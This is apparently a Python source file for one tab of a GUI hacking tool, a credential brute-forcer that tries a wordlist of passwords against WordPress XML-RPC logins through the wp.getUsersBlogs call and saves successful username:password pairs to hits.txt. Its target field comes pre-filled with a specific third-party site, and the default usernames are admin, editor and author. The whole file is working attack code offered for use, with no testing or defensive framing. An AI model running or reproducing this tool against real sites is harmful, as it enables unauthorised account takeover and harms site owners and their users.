ui/tabs_brute.py

import customtkinter as ctk import xmlrpc.client, threading from tkinter import messagebox, filedialog

def load_brute_tab(tab): def run_brute_force(): target = target_entry.get().strip() usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()] wordlist_path = wordlist_entry.get().strip()

if not target or not usernames or not wordlist_path:
        messagebox.showerror("Error", "Please fill all fields.")
        return

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Cannot read password list:\n{e}")
        return

    log_box.insert("end", "[*] Starting brute force...\n")
    server = xmlrpc.client.ServerProxy(target)

    for user in usernames:
        log_box.insert("end", f"\n[*] Trying user: {user}\n")
        for password in passwords:
            try:
                resp = server.wp.getUsersBlogs(user, password)
                if resp:
                    hit = f"[+] HIT: {user}:{password}\n"
                    log_box.insert("end", hit)
                    with open("hits.txt", "a") as hit_file:
                        hit_file.write(f"{user}:{password}\n")
                    break
            except xmlrpc.client.Fault:
                pass
            except Exception as e:
                log_box.insert("end", f"[-] Error with {user}: {e}\n")
                break

    log_box.insert("end", "[*] Brute force finished.\n")

def browse_wordlist():
    path = filedialog.askopenfilename()
    if path:
        wordlist_entry.delete(0, "end")
        wordlist_entry.insert(0, path)

ctk.CTkLabel(tab, text="Target URL (https://example.com/xmlrpc.php)").pack(pady=5)
target_entry = ctk.CTkEntry(tab, width=700)
target_entry.insert(0, "https://www.zayachek.com/xmlrpc.php")
target_entry.pack()

ctk.CTkLabel(tab, text="Usernames (one per line)").pack(pady=5)
usernames_box = ctk.CTkTextbox(tab, height=100, width=700)
usernames_box.insert("0.0", "admin\neditor\nauthor")
usernames_box.pack()

ctk.CTkLabel(tab, text="Password List").pack(pady=5)
wordlist_frame = ctk.CTkFrame(tab)
wordlist_frame.pack()
wordlist_entry = ctk.CTkEntry(wordlist_frame, width=500)
wordlist_entry.pack(side="left", padx=5)
browse_btn = ctk.CTkButton(wordlist_frame, text="Browse", command=browse_wordlist)
browse_btn.pack(side="left")

start_btn = ctk.CTkButton(tab, text="Start Brute Force", fg_color="green", hover_color="darkgreen",
                          command=lambda: threading.Thread(target=run_brute_force).start())
start_btn.pack(pady=10)

global log_box
log_box = ctk.CTkTextbox(tab, height=200, width=700)
log_box.pack()

